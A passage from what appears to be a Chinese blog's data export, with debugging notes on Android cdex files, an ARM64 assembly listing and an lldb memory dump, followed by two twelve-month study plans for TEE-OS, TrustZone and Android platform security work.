href=\"https://github.com/AlienwareHe/RDex\">https://github.com/AlienwareHe/RDex</a><br>在安卓9中为了减少内存的使用量，引入了cdex，magic为cdex001，这导致我们dump出来的dex不是一个正常的Dex结构，无法被jadx等反编译。</p>\n<p>adb shell pm list packages 展示包<br>展示包所在的路径<br>adb shell pm path com.android.systemui</p>\n<p>汇编：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main:                                   // @main</span><br><span class=\"line\">\t.cfi_startproc</span><br><span class=\"line\">// %bb.0:</span><br><span class=\"line\">\tsub\tsp, sp, #64                     // =64</span><br><span class=\"line\">\tstp\tx29, x30, [sp, #48]             // 16-byte Folded Spill</span><br><span class=\"line\">\tadd\tx29, sp, #48                    // =48</span><br><span class=\"line\">\t.cfi_def_cfa w29, 16</span><br><span class=\"line\">\t.cfi_offset w30, -8</span><br><span class=\"line\">\t.cfi_offset w29, -16</span><br><span class=\"line\">\tmov\tw8, wzr</span><br><span class=\"line\">\tstr\tw8, [sp, #20]                   // 4-byte Folded Spill</span><br><span class=\"line\">\tstur\twzr, [x29, #-4]</span><br><span class=\"line\">\tadrp\tx8, .L.str</span><br><span class=\"line\">\tadd\tx8, x8, :lo12:.L.str</span><br><span class=\"line\">\tstur\tx8, [x29, #-16]</span><br><span class=\"line\">\tadrp\tx8, .L__const.main.buffer</span><br><span class=\"line\">\tadd\tx8, x8, :lo12:.L__const.main.buffer</span><br><span class=\"line\">\tldr\tw9, [x8]</span><br><span class=\"line\">\tadd\tx10, sp, #24                    // =24</span><br><span class=\"line\">\tstr\tx10, [sp, #8]                   // 8-byte Folded Spill</span><br><span class=\"line\">\tstr\tw9, [sp, #24]</span><br><span class=\"line\">\tldrh\tw8, [x8, #4]</span><br><span class=\"line\">\tstrh\tw8, [sp, #28]</span><br><span class=\"line\">\tldur\tx0, [x29, #-16]</span><br><span class=\"line\">\tbl\tprintf</span><br><span class=\"line\">\tldr\tx0, [sp, #8]                    // 8-byte Folded Reload</span><br><span class=\"line\">\tbl\tprintf</span><br><span class=\"line\">\tldr\tw0, [sp, #20]                   // 4-byte Folded Reload</span><br><span class=\"line\">\tldp\tx29, x30, [sp, #48]             // 16-byte Folded Reload</span><br><span class=\"line\">\tadd\tsp, sp, #64                     // =64</span><br><span class=\"line\">\tret</span><br><span class=\"line\">.Lfunc_end2:</span><br><span class=\"line\">\t.size\tmain, .Lfunc_end2-main</span><br><span class=\"line\">\t.cfi_endproc</span><br><span class=\"line\">                                        // -- End function</span><br><span class=\"line\">\t.type\t.L.str,@object                  // @.str</span><br><span class=\"line\">\t.section\t.rodata.str1.1,&quot;aMS&quot;,@progbits,1</span><br><span class=\"line\">.L.str:</span><br><span class=\"line\">\t.asciz\t&quot;hello&quot;</span><br><span class=\"line\">\t.size\t.L.str, 6</span><br><span class=\"line\"></span><br><span class=\"line\">\t.type\t.L__const.main.buffer,@object   // @__const.main.buffer</span><br><span class=\"line\">.L__const.main.buffer:</span><br><span class=\"line\">\t.asciz\t&quot;hello&quot;</span><br><span class=\"line\">\t.size\t.L__const.main.buffer, 6</span><br></pre></td></tr></table></figure>\n<p>(lldb) register read sp<br>      sp = 0x0000007ffffffd80<br>(lldb) memoey read 0x0000007ffffffd80<br>error: ‘memoey’ is not a valid command.<br>(lldb) memory read 0x0000007ffffffd80<br>0x7ffffffd80: 00 00 00 00 00 00 00 00 98 fd ff ff 7f 00 00 00  …………….<br>0x7ffffffd90: 00 00 00 00 00 00 00 00 68 65 6c 6c 6f 00 00 00  ……..hello…<br>(lldb) memory read -c 0x60  0x0000007ffffffd80<br>0x7ffffffd80: 00 00 00 00 00 00 00 00 98 fd ff ff 7f 00 00 00  …………….<br>0x7ffffffd90: 00 00 00 00 00 00 00 00 68 65 6c 6c 6f 00 00 00  ……..hello…<br>0x7ffffffda0: 78 55 55 55 55 00 00 00 00 00 00 00 00 00 00 00  xUUUU………..<br>0x7ffffffdb0: c0 fd ff ff 7f 00 00 00 70 63 aa f4 7f 00 00 00  ……..pc……<br>0x7ffffffdc0: 10 fe ff ff 7f 00 00 00 f4 66 55 55 55 00 00 00  ………fUUU…<br>0x7ffffffdd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  …………….</p>\n<p>c++</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>cdex001  <a href=\"https://github.com/AlienwareHe/RDex\">https://github.com/AlienwareHe/RDex</a><br>在安卓9中为了减少内存的使用量，引入了cdex，magic为cdex001，这导致我们dump出来的dex不是一个正常的Dex结构，无法被jadx等反编译。</p>\n<p>adb shell pm list packages 展示包<br>展示包所在的路径<br>adb shell pm path com.android.systemui</p>\n<p>汇编：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">main:                                   // @main</span><br><span class=\"line\">\t.cfi_startproc</span><br><span class=\"line\">// %bb.0:</span><br><span class=\"line\">\tsub\tsp, sp, #64                     // =64</span><br><span class=\"line\">\tstp\tx29, x30, [sp, #48]             // 16-byte Folded Spill</span><br><span class=\"line\">\tadd\tx29, sp, #48                    // =48</span><br><span class=\"line\">\t.cfi_def_cfa w29, 16</span><br><span class=\"line\">\t.cfi_offset w30, -8</span><br><span class=\"line\">\t.cfi_offset w29, -16</span><br><span class=\"line\">\tmov\tw8, wzr</span><br><span class=\"line\">\tstr\tw8, [sp, #20]                   // 4-byte Folded Spill</span><br><span class=\"line\">\tstur\twzr, [x29, #-4]</span><br><span class=\"line\">\tadrp\tx8, .L.str</span><br><span class=\"line\">\tadd\tx8, x8, :lo12:.L.str</span><br><span class=\"line\">\tstur\tx8, [x29, #-16]</span><br><span class=\"line\">\tadrp\tx8, .L__const.main.buffer</span><br><span class=\"line\">\tadd\tx8, x8, :lo12:.L__const.main.buffer</span><br><span class=\"line\">\tldr\tw9, [x8]</span><br><span class=\"line\">\tadd\tx10, sp, #24                    // =24</span><br><span class=\"line\">\tstr\tx10, [sp, #8]                   // 8-byte Folded Spill</span><br><span class=\"line\">\tstr\tw9, [sp, #24]</span><br><span class=\"line\">\tldrh\tw8, [x8, #4]</span><br><span class=\"line\">\tstrh\tw8, [sp, #28]</span><br><span class=\"line\">\tldur\tx0, [x29, #-16]</span><br><span class=\"line\">\tbl\tprintf</span><br><span class=\"line\">\tldr\tx0, [sp, #8]                    // 8-byte Folded Reload</span><br><span class=\"line\">\tbl\tprintf</span><br><span class=\"line\">\tldr\tw0, [sp, #20]                   // 4-byte Folded Reload</span><br><span class=\"line\">\tldp\tx29, x30, [sp, #48]             // 16-byte Folded Reload</span><br><span class=\"line\">\tadd\tsp, sp, #64                     // =64</span><br><span class=\"line\">\tret</span><br><span class=\"line\">.Lfunc_end2:</span><br><span class=\"line\">\t.size\tmain, .Lfunc_end2-main</span><br><span class=\"line\">\t.cfi_endproc</span><br><span class=\"line\">                                        // -- End function</span><br><span class=\"line\">\t.type\t.L.str,@object                  // @.str</span><br><span class=\"line\">\t.section\t.rodata.str1.1,&quot;aMS&quot;,@progbits,1</span><br><span class=\"line\">.L.str:</span><br><span class=\"line\">\t.asciz\t&quot;hello&quot;</span><br><span class=\"line\">\t.size\t.L.str, 6</span><br><span class=\"line\"></span><br><span class=\"line\">\t.type\t.L__const.main.buffer,@object   // @__const.main.buffer</span><br><span class=\"line\">.L__const.main.buffer:</span><br><span class=\"line\">\t.asciz\t&quot;hello&quot;</span><br><span class=\"line\">\t.size\t.L__const.main.buffer, 6</span><br></pre></td></tr></table></figure>\n<p>(lldb) register read sp<br>      sp = 0x0000007ffffffd80<br>(lldb) memoey read 0x0000007ffffffd80<br>error: ‘memoey’ is not a valid command.<br>(lldb) memory read 0x0000007ffffffd80<br>0x7ffffffd80: 00 00 00 00 00 00 00 00 98 fd ff ff 7f 00 00 00  …………….<br>0x7ffffffd90: 00 00 00 00 00 00 00 00 68 65 6c 6c 6f 00 00 00  ……..hello…<br>(lldb) memory read -c 0x60  0x0000007ffffffd80<br>0x7ffffffd80: 00 00 00 00 00 00 00 00 98 fd ff ff 7f 00 00 00  …………….<br>0x7ffffffd90: 00 00 00 00 00 00 00 00 68 65 6c 6c 6f 00 00 00  ……..hello…<br>0x7ffffffda0: 78 55 55 55 55 00 00 00 00 00 00 00 00 00 00 00  xUUUU………..<br>0x7ffffffdb0: c0 fd ff ff 7f 00 00 00 70 63 aa f4 7f 00 00 00  ……..pc……<br>0x7ffffffdc0: 10 fe ff ff 7f 00 00 00 f4 66 55 55 55 00 00 00  ………fUUU…<br>0x7ffffffdd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  …………….</p>\n<p>c++</p>\n"},{"_content":"以下是一份为期 12 个月左右的学习路径和时间规划，涵盖岗位所需的关键技能（TEE-OS、安全子系统、Android 系统安全、Linux/RTOS 驱动开发、密码学、渗透测试等）。在此基础上，你可根据实际情况（工作项目进度、个人掌握速度等）进行微调。整体分为 4 个阶段，每个阶段 3 个月左右。\n\n第一阶段（第 1~3 个月）：夯实基础\n\n目标：C/C++ 能力、操作系统与安全概念、初步了解 ARM 体系结构和基本密码学原理。\n\t1.\t第 1 个月：C/C++ 加强 & 操作系统原理\n\t•\tC/C++ 回顾与强化\n\t•\t熟练掌握指针、内存管理、面向对象、多线程编程；\n\t•\t学习常见库函数与 STL 容器；\n\t•\t练习编译/链接过程，使用 GDB、LLDB 调试工具；\n\t•\t建议完成一些 LeetCode（或算法题）以及 简单命令行工具 开发提升综合运用。\n\t•\t操作系统与进程/线程安全\n\t•\t学习《Operating System Concepts》或《Modern Operating Systems》中的进程管理、内存管理、文件系统、安全机制；\n\t•\t了解用户态/内核态的概念、Linux 的权限模型（UID/GID）和权限分级。\n\t2.\t第 2 个月：ARM 架构基础 & Linux 驱动初步\n\t•\tARM 架构入门\n\t•\t阅读《ARMv7/ARMv8 Architecture Reference Manual》的基础章节，了解寄存器、异常模式、指令集（只需了解常用指令）；\n\t•\t搭建一个 QEMU + ARM 环境，尝试编译一个简易的 Linux Kernel 运行在 QEMU 中，熟悉交叉编译流程。\n\t•\tLinux 驱动开发初步\n\t•\t学习 LDD3 (Linux Device Drivers 3rd Ed.)（或更新）前几章，了解字符设备、内核日志（printk）调试；\n\t•\t试着写一个简单的 字符设备驱动，练习编译内核模块、插拔模块（insmod/rmmod）。\n\t3.\t第 3 个月：密码学和安全模型\n\t•\t对称加密 / 非对称加密 / 哈希\n\t•\t学习 AES、DES、RSA、ECC、SHA-256 等基础算法原理；\n\t•\t实验：使用 OpenSSL 或 mbedTLS 写小段代码完成加解密、签名验签、哈希运算；\n\t•\t了解 PKI / 证书（X.509）基础知识，知道如何生成自签名证书。\n\t•\t安全模型和访问控制\n\t•\t熟悉 Linux 中的 DAC、MAC（SELinux / AppArmor） 概念；\n\t•\t大体了解 Android 安全模型（应用沙箱、权限机制）。\n\n第二阶段（第 4~6 个月）：深入 ARM TrustZone 与 TEE-OS\n\n目标：掌握 TrustZone 原理，能在主流 TEE-OS（如 OP-TEE、QSEE、Trusty）上进行开发调试；理解生物识别、支付等安全业务如何在 TEE 中实现。\n\t1.\t第 4 个月：TrustZone 基本机制\n\t•\tTrustZone 关键概念\n\t•\tNormal World / Secure World、SMC（Secure Monitor Call）、中断处理、TZASC、内存隔离；\n\t•\t参考文档：ARM 官方的 Security Extensions Reference，或社区项目的博客/资料。\n\t•\t搭建实验环境\n\t•\t可选择 OP-TEE（开源且文档相对完善）在 QEMU 或者特定开发板（如 Raspberry Pi 3/4，HiKey960 等）上搭建；\n\t•\t跑通一个 Hello World TA（Trusted Application），从 Normal World 调用 Secure World 的接口。\n\t2.\t第 5 个月：TEE OS 框架与 TA 开发\n\t•\tOP-TEE / Trusty / QSEE 原理\n\t•\t学习 TEE 的进程管理、RPC 机制、存储安全等；\n\t•\t阅读 GlobalPlatform TEE 标准：Client API、Internal Core API、Security Extensions。\n\t•\tTA 编程实践\n\t•\t编写一个简易 TA，封装 AES 加密/解密或 HMAC 生成；\n\t•\t在 Normal World 写 Client 程序，通过 TEE Client API 与 TA 通信；\n\t•\t练习调试 TA：查看日志、设置断点等。\n\t3.\t第 6 个月：安全子系统（生物识别、支付、TUI、HDCP、StrongBox）\n\t•\t生物识别 & TUI\n\t•\t了解指纹/人脸识别在 TEE 中的典型实现：特征点存储、匹配流程、TUI 防截屏；\n\t•\t学习供应商/OP-TEE 提供的 例程或文档（如指纹 TA 示例）。\n\t•\t移动支付 / DRM（HDCP）\n\t•\t掌握 NFC 支付、Token 化 流程；\n\t•\tHDCP 大体原理：在 Secure World 中实现密钥交换与内容解密。\n\t•\tStrongBox\n\t•\tAndroid 的 StrongBox Keymaster / Gatekeeper：在硬件安全单元里完成密钥存储和验证；\n\t•\t学习 Android Key Attestation、SafetyNet 原理。\n\n第三阶段（第 7~9 个月）：Android 安全加固与驱动高级调试\n\n目标：对 Android 系统安全（AVB、dm-verity、SELinux 政策）有深刻理解，具备编写和调试更复杂的安全驱动或 RTOS 驱动的能力。\n\t1.\t第 7 个月：Android 系统安全\n\t•\tAVB (Android Verified Boot)\n\t•\t阅读官方文档 & 源码（AOSP 中 bootable/bootloader/*、system/core/avb 等），了解引导链、vbmeta、签名校验；\n\t•\t实践：编译一个自定义 AVB 启动流程，对 boot.img、system.img 签名并进行校验。\n\t•\tdm-verity\n\t•\t学习 dm-verity 工作原理（内核 device-mapper），如何实时校验文件系统数据完整性；\n\t•\t配置内核选项 CONFIG_DM_VERITY 并在编译时将 rootfs 或 system 分区打包成带校验树的镜像。\n\t2.\t第 8 个月：SELinux 策略 & KeyStore\n\t•\tSELinux\n\t•\t理解 DAC vs. MAC，掌握 SELinux 中的 type、domain、rule 等概念；\n\t•\t修改 AOSP SELinux 策略文件（system/sepolicy），给自定义服务或驱动分配合适权限；\n\t•\t使用 adb shell dmesg, adb logcat 分析 SELinux 拒绝日志（avc: denied）。\n\t•\tAndroid KeyStore / StrongBox\n\t•\t学习 Android 在用户态如何调用 KeyStore 服务（system/security/keystore），实际调用 TEE Keymaster TA；\n\t•\t练习：在 App 层使用 KeyGenerator/KeyPairGenerator 创建硬件级密钥，并进行签名加密。\n\t3.\t第 9 个月：Linux/RTOS 驱动进阶\n\t•\t多线程 & 同步\n\t•\t内核同步机制（spinlock、mutex、semaphore、rwlock 等），注意死锁与竞态调试；\n\t•\t高阶驱动特性\n\t•\tDMA、PCI(e) / USB / I2C / SPI 驱动编写；\n\t•\t学习 Device Tree，为目标开发板编写 DT 配置；\n\t•\tRTOS 驱动\n\t•\t选一个简单 RTOS（如 FreeRTOS、Zephyr），查看其驱动架构，移植一个小型驱动（如 LED、串口、I2C 设备等）。\n\n第四阶段（第 10~12 个月）：安全认证、攻防测试与项目实战\n\n目标：对系统进行安全评估与渗透测试；完成一到两个综合性项目，检验前面所学。\n\t1.\t第 10 个月：安全认证与渗透测试\n\t•\t行业安全标准\n\t•\t了解 FIPS 140-2/3、Common Criteria (CC EAL)、EMVCo 等，对相关流程有大体认知；\n\t•\t学习如何准备认证文档，如安全目标 (Security Target)、威胁模型、受评估范围定义等。\n\t•\t攻防测试\n\t•\t学习常见逆向分析工具：IDA Pro、Ghidra、Frida 等；\n\t•\t在测试手机/开发板上，尝试对自研 TEE APP 或安全驱动做渗透模拟（Hook、内存修改、文件篡改等），检查安全缺陷。\n\t•\t安全审计\n\t•\t使用 Cppcheck / Coverity 等工具对 C/C++ 代码进行静态分析，修复潜在风险。\n\t2.\t第 11 个月：项目实战（示例项目）\n\t•\t项目 A：Android + TEE 通信 & 生物识别\n\t•\t在 OP-TEE/Trusty 上实现一个生物识别 TA（或与已有 TA 对接），在 Normal World 写服务管理流程；\n\t•\t将采集到的指纹/人脸特征数据送入 TEE 进行匹配，并验证结果。\n\t•\t项目 B：自定义 AVB + dm-verity\n\t•\t在一块 ARM 开发板上编译自定义引导（u-boot 或 bootloader），集成 AVB；\n\t•\t为 system 分区配置 dm-verity 并验证启动成功后进行修改测试，观察系统是否能检测出篡改。\n\t3.\t第 12 个月：总结与深化\n\t•\t总结\n\t•\t整理项目中遇到的难点（驱动、密钥管理、性能、调试），撰写技术博客或学习笔记；\n\t•\t深化\n\t•\t规划下一个阶段的横向拓展：研究 Hypervisor / 虚拟化安全、更多硬件安全模块（TPM、eSE）等；\n\t•\t或更纵向专攻某块领域（如生物识别算法加速、支付安全、DRM 内容保护等）。\n\n参考资料与工具\n\t•\t操作系统 & 驱动\n\t•\t《Linux Device Drivers》 (LDD3)\n\t•\t《Understanding the Linux Kernel》\n\t•\tARM 官方手册、QEMU、GDB\n\t•\tTrustZone & TEE\n\t•\tOP-TEE 官方文档、GitHub: OP-TEE/manifest\n\t•\tARMv8 Security Extensions Reference Manual\n\t•\tGlobalPlatform TEE Specifications\n\t•\tAndroid 安全\n\t•\tAOSP 源码阅读\n\t•\tAndroid Developers 文档下的 Security、AVB、dm-verity、SELinux\n\t•\tAndroid Security Bulletins\n\t•\t密码学\n\t•\t《Applied Cryptography》 by Bruce Schneier\n\t•\tOpenSSL / mbedTLS 源码、FIPS 140-2/3 文档\n\t•\t渗透测试 & 攻防\n\t•\t《The Art of Software Security Assessment》\n\t•\tIDA Pro、Ghidra、Frida、AFL (Fuzzing) 等常用工具\n\t•\t认证 & 规范\n\t•\tCommon Criteria、FIPS、EMVCo、PCI DSS 等官方文档\n\n如何执行与保持进度\n\t1.\t每月/每周有明确目标：如“本周完成 OP-TEE 上 HelloWorld TA”，下周再做 AES-TA。\n\t2.\t做笔记与复盘：关键项目/技术点写成文档或博客，便于回顾与知识积累。\n\t3.\t结合实际项目：若工作中有真实 TEE/安全驱动需求，尽量将计划与业务需求结合，效率更高。\n\t4.\t灵活调整：若某部分进展快或慢，及时优化计划，不必拘泥于固定月份。\n\n通过上述4 个阶段、12 个月的循序渐进规划，你可以全面提升在安全子系统、TEE-OS、Android 系统安全以及Linux/RTOS 驱动开发方面的能力。过程中不断实践、调试、总结，就能为今后承担平台安全架构、关键驱动开发、乃至主导安全认证打下坚实基础。祝学习顺利、早日成为这个领域的专家！\n\n\n\n\n下面给出一个较系统、循序渐进的学习规划，帮助你围绕安全子系统、TEE-OS 等方向夯实基础、扩展技能。在实际执行中，可根据个人情况灵活调整节奏和侧重点。\n\n一、计算机与操作系统安全基础\n\t1.\t补充计算机基础知识\n\t•\t编译原理、操作系统原理、计算机体系结构：夯实对 CPU、内存管理、进程/线程调度、文件系统等底层概念的理解。\n\t•\t语言能力：C/C++ 是核心开发语言，可以结合小型项目（如移植某些开源库）来强化语法、调试能力，同时了解一点编译器、链接器的工作原理。汇编基础可以从 ARM 汇编入门（简单了解寄存器、常用指令）开始。\n\t2.\t操作系统安全概念\n\t•\t安全模型（MAC、DAC）：学习 Linux 中的 SELinux / AppArmor 等强制访问控制模型；\n\t•\t用户态与内核态：了解系统调用流程和权限隔离；\n\t•\tRoot、Sandbox、权限管理：尤其在移动端（Android）如何实现应用沙箱、权限隔离；\n\t•\t软件完整性保护：如签名校验、可执行文件验证等。\n\t3.\t加密与认证基础\n\t•\t对称加密（AES、DES）、非对称加密（RSA、ECC）、哈希算法（SHA 系列）等；\n\t•\tPKI/证书体系，常见的 X.509 证书结构、TLS 基础；\n\t•\tKey Management（密钥管理）：对关键秘钥的存储和使用策略；\n\t•\t常用密码学库：OpenSSL、mbedTLS 等，练习如何生成/验证签名、加解密操作等。\n\n目标：\n\t•\t能熟练运用 C/C++，并对操作系统安全和加密基础有扎实掌握。\n\n二、深入 ARM 架构与 TrustZone\n\t1.\tARM 架构\n\t•\tARMv7/v8 基础：对 ARM 处理器模式、指令集、特权级别有整体认识；\n\t•\t中断、异常：了解 ARM 下异常向量表、异常处理机制等；\n\t•\tMemory Management Unit (MMU)、缓存一致性、寄存器管理。\n\t2.\tARM TrustZone 技术\n\t•\tTrustZone 基本概念：Normal World / Secure World、Security Extension、TZASC (TrustZone Address Space Controller)。\n\t•\t上下文切换：如何在 SMC（Secure Monitor Call）指令的触发下进行世界切换；\n\t•\tTEE OS 的结构：Secure Monitor、Secure Kernel、Secure Service / TA（Trusted Application）间的关系。\n\t3.\t硬件安全模块\n\t•\t了解终端硬件中如何集成 eSE (embedded Secure Element)、TPM (Trusted Platform Module) 等；\n\t•\t在移动设备上常见的安全元件架构（如 Apple 的 Secure Enclave，安卓的 StrongBox / Titan M 等）。\n\n目标：\n\t•\t深刻理解 TrustZone 的安全模型与机制，为后续研究 TEE OS 打好基础。\n\n三、TEE-OS 安全业务与开发\n\t1.\tTEE-OS 原理与架构\n\t•\t常见 TEE 方案：OP-TEE、Kinibi、QSEE、Trusty 等；\n\t•\t学习其启动流程、 TA (Trusted Application) 生命周期、内存隔离、IPC 调用方式。\n\t•\t熟悉 GlobalPlatform TEE 规范：包括 TEE Client API、TEE Internal Core API、TEE Secure Element API 等。\n\t2.\t安全子系统（生物识别、支付、TUI、HDCP、StrongBox）\n\t•\t生物识别（指纹/人脸）：\n\t•\t了解传感器驱动到 TEE 中算法处理的流程、如何在安全环境中存储/对比生物特征；\n\t•\t重点掌握 TEE 生物识别相关的认证流程和隐私保护策略。\n\t•\t移动支付 / NFC 支付：\n\t•\t与 TEE 结合实现安全支付，如主流 HCE（Host Card Emulation）或 eSE 做法；\n\t•\tTUI (Trusted User Interface)：\n\t•\t在输入 PIN / 密码时，如何进入安全模式防截屏、防篡改；\n\t•\t可能需要和图形栈、显示驱动结合，确保显示/触摸事件在 Secure World 处理。\n\t•\tHDCP：\n\t•\t学习内容保护机制、key 流程，如何在 TEE 中完成加密、解密和认证；\n\t•\tStrongBox：\n\t•\tAndroid 平台提供的硬件级密钥存储，结合 TEE（或独立安全芯片）确保 Key 的不可导出。\n\t•\t熟悉 Keymaster / StrongBox Keymaster API。\n\t3.\t防篡改、防逆向\n\t•\t常见的“安全白盒”方案/代码混淆思路，可在 TEE 中执行关键操作；\n\t•\t研究安全启动链：从 Bootloader -> AVB (Android Verified Boot) -> dm-verity -> OS 加载的完整性保护机制。\n\n目标：\n\t•\t熟悉 TEE OS 工作原理、能开发或调试 Trusted Application；\n\t•\t能基于 TEE 架构实施生物识别、支付、内容保护等安全业务的设计与集成。\n\n四、Android 系统安全（AVB、dm-verity 等）\n\t1.\tAndroid Verified Boot (AVB)\n\t•\t了解 Bootloader 分级加载和分区签名验证流程；\n\t•\t研究 vbmeta、boot、system 等分区如何对其完整性和签名进行验证；\n\t•\t掌握如何定制 AVB 策略、签名工具（avbtool）。\n\t2.\tdm-verity\n\t•\t明白 dm-verity 的设备映射原理、如何对文件系统（system、vendor 等分区）进行哈希校验；\n\t•\t配置和编译内核支持 dm-verity，调试相关故障。\n\t3.\tAndroid Security Model\n\t•\tSELinux 策略编写、权限管理；\n\t•\tSystem Services / HAL 与 TEE、keystore 交互；\n\t•\tAndroid KeyStore / StrongBox API 的使用。\n\t4.\t内核安全防护\n\t•\tKASLR、SELinux、seccomp、AppArmor（在某些发行版中）等安全机制；\n\t•\t常见内核漏洞成因及修复策略。\n\n目标：\n\t•\t能在 Android 平台上进行安全加固，理解从 Bootloader 到文件系统完整性的链式验证；\n\t•\t能对系统进行定制化安全功能（如自定义签名策略、内核强化等）。\n\n五、Linux/RTOS 驱动开发与调试\n\t1.\tLinux 驱动开发\n\t•\t驱动模型与设备树（Device Tree），字符设备 / 块设备 / 网络设备驱动的区别；\n\t•\t常见接口：I2C、SPI、UART、GPIO 等；\n\t•\t了解内核态内存管理、竞争同步、调试技巧（printk、ftrace、kgdb 等）。\n\t2.\t嵌入式 RTOS 驱动\n\t•\t如果安全模块运行在某些小型 RTOS（如 FreeRTOS、ThreadX、Zephyr 等），需学习其任务调度、驱动框架、与硬件寄存器交互方式。\n\t•\t结合硬件手册进行移植和优化。\n\t3.\t安全驱动\n\t•\t例如 TUI 驱动、Secure Monitor 驱动、Crypto Engine 驱动等，如何与 TrustZone 或 TEE OS 交互；\n\t•\t解决调试权限问题（Secure World / Non-Secure World），可能需要编写特定的 SMC 调用适配层。\n\n目标：\n\t•\t能编写或移植底层驱动，理解硬件与软件系统交互；\n\t•\t掌握在安全环境下进行驱动开发/调试的要点（如权限、内存保护）。\n\n六、安全认证与测试\n\t1.\t安全认证相关标准\n\t•\t了解 FIPS 140-2/3、CC EAL (Common Criteria) 等认证体系；\n\t•\t知晓行业常见安全认证要求（金融支付、移动终端安全等），如 PCI DSS、EMVCo、UnionPay 规范等。\n\t2.\t渗透测试、攻防测试\n\t•\t学习常见的逆向分析、调试、内存注入、漏洞利用方式；\n\t•\t熟悉移动端常见的安全攻防手段（Magisk、Xposed、Hook、Rootkit 等），以及如何对抗这些攻击；\n\t•\t工具：IDA Pro、Ghidra、Frida、AFL（模糊测试）等。\n\t3.\t系统分析工具\n\t•\tAndroid 平台调试：logcat、adb shell、systrace、Perfetto 等；\n\t•\t内核调试：gdb、ftrace、KGDB；\n\t•\t代码审计工具：SonarQube、Cppcheck、Coverity。\n\n目标：\n\t•\t能够从对抗的角度审视安全方案的脆弱点；\n\t•\t具备基本的渗透测试思维，在设计、实现阶段就避免常见漏洞。\n\n七、项目实践与综合运用\n\t1.\t实践项目选题\n\t•\t开发一个简易 TEE 应用：比如在 OP-TEE 上编写 TA，实现对称加解密或密钥管理，然后在 Normal World 写 client 测试；\n\t•\t移植并自定义 AVB 或 dm-verity：配置一个自定义签名的引导流程；\n\t•\t生物识别集成：与指纹/人脸传感器驱动联动，将核心算法和特征匹配放在 Secure World；\n\t•\t安全驱动：为一个虚拟硬件加密模块写 Linux 驱动，并通过 SMC 调用到 TEE 中完成加解密。\n\t2.\t文档与设计\n\t•\t在做项目时多写设计文档、Threat Modeling，用数据流图和攻击面分析工具来评估安全风险。\n\t•\t学习如何编写安全需求说明书、如何通过单元测试/集成测试验证安全功能的正确性和鲁棒性。\n\t3.\t开源社区交流\n\t•\t多关注 GitHub/社区上的 TEE 相关项目（OP-TEE、libtee、Trusty 等），阅读源码和 issue；\n\t•\t学习其他开发者的实现思路与安全要点，及时跟进社区最新补丁与安全通告。\n\n八、持续提升与进阶\n\t1.\t跟进最新行业动态\n\t•\t关注 Android Security Bulletin、CVE 等安全漏洞公告；\n\t•\t学习顶会/黑客大会演讲（Black Hat、DEF CON、CanSecWest 等）里对移动终端和 TEE 攻击思路的前沿分享。\n\t2.\t纵深防御\n\t•\t除了 TEE 层，还可学习 container、虚拟化技术（KVM、Hypervisor）对安全加固的意义。\n\t•\t研究微架构安全问题（Meltdown、Spectre 等）及其缓解措施。\n\t3.\t获取专业认证（可选）\n\t•\t如果工作中涉及国际/金融安全标准，可关注 FIPS 140-2/3, CC EAL 评估流程，或类似的产品安全认证过程；\n\t•\t也可考虑通用安全认证如 CISSP、OSCP（偏渗透）等做综合提升（可根据职业方向选择是否深入）。\n\n总结\n\n根据岗位描述，你需要兼顾系统安全、驱动开发、TEE-OS 业务、渗透/攻防等多重技能。上面给出的学习规划从基础到进阶，涵盖了：\n\t1.\t操作系统与加密基础\n\t2.\tARM 架构与 TrustZone\n\t3.\tTEE-OS 关键安全业务\n\t4.\tAndroid 系统安全\n\t5.\tLinux/RTOS 